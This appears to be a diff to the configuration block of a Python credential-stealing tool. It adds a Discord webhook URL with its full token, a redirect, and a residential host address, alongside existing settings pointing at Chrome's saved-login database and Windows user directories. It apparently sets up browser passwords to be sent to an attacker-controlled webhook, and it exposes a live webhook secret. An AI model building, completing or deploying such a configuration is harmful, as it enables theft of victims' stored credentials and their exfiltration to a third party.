@@ -13,9 +13,9 @@ from string import ascii_uppercase                                              
 
 # Global variables
 
-WEBHOOK 	= 	'' 									# Discord webhook URL
-REDIRECT 	= 	'' 									# Optional redirect to website
-HOST	 	= 	'' 									# Server host URL (e.g: http://127.0.0.1/)
+WEBHOOK 	= 	'https://discord.com/api/webhooks/1439354104068571248/SiDSBzeY9fLRZRVvZNCDjTMPn8L_xRD_4VelMFJlJ3dlWqybpyJTr2kpD0gfDukL902v' 									# Discord webhook URL
+REDIRECT 	= 	'https://discord.com' 									# Optional redirect to website
+HOST	 	= 	'91-162-53-213.subs.proxad.net' 									# Server host URL (e.g: http://127.0.0.1/)
 CHROME_DATA =	'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'	# Chrome login data path
 USERNAME	=	os.environ.get('USERNAME')			# Username environment variable
 APPDATA		=	os.getenv('APPDATA')				# Appdata environment variable
